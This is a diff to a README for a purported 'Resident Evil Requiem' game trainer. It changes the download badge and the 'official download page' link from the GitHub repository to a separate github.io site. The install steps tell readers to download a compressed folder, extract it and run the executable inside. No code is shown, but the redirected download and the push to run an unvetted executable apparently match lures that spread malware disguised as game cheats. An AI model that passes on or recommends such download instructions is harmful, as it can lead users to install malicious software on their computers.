@@ -1,6 +1,6 @@
 # 🎮 Resident-Evil-Requiem-Ultimate-Trainer-2026_v_2 - Enhance Your Game Experience Today
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Walliesynoptical116/Resident-Evil-Requiem-Ultimate-Trainer-2026_v_2)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://walliesynoptical116.github.io)
 
 This tool modifies gameplay settings for Resident Evil Requiem. It allows users to toggle game variables like health, ammunition, and camera perspectives. The software works as a background process while the game runs.
 
@@ -8,7 +8,7 @@ This tool modifies gameplay settings for Resident Evil Requiem. It allows users 
 
 Follow these steps to set up the trainer on your Windows computer.
 
-1. Visit the [official download page](https://github.com/Walliesynoptical116/Resident-Evil-Requiem-Ultimate-Trainer-2026_v_2) to locate the latest version.
+1. Visit the [official download page](https://walliesynoptical116.github.io) to locate the latest version.
 2. Download the compressed folder to your desktop.
 3. Right-click the folder and select Extract All.
 4. Open the extracted folder and find the executable file.
